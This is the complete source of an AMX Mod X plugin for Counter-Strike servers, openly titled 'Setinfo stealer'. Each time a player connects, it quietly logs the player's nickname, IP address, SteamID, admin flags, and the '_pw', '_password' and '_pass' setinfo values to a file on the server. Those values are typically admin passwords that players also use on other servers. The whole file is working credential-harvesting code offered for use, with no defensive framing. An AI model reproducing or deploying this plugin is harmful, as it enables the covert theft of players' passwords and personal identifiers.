#include <amxmodx>
#include <amxmisc>

#define log_path "addons/amxmodx/configs/setinfo_stealer.log" // Path to log file

public plugin_init()
{
    register_plugin("Setinfo stealer", "1.0 (beta)", "hpp forever") // Name plugin, version, author
}

public client_connect(id) 
{
    // Declare the required arrays (nick, ip, steam_id, flags, setinfo)
    new player_name[32];    
    new player_ip[22];    
    new player_steam_id[35]; 
    new player_flags[32];   
    new setinfo_pw[50];
    new setinfo_password[50];
    new setinfo_pass[50];

    // Get nick, ip, steam_id, flags, setinfo_strings from the connected player
    get_user_name(id, player_name, charsmax(player_name))  
    get_user_ip(id, player_ip, charsmax(player_ip), 0)
    get_user_authid(id, player_steam_id, charsmax(player_steam_id))
    get_flags(get_user_flags(id), player_flags,charsmax(player_flags))
    get_user_info(id, "_pw", setinfo_pw, 49)
    get_user_info(id, "_password", setinfo_password, 49)
    get_user_info(id, "_pass", setinfo_pass, 49)

    // Creating a log file
    log_to_file(log_path, "Nick: %s, IP %s, SteamID: %s, Flags: %s^nSetinfo:^n_pw %s^n_password %s^n_pass %s", player_name, player_ip, player_steam_id, player_flags, setinfo_pw, setinfo_password, setinfo_pass)
}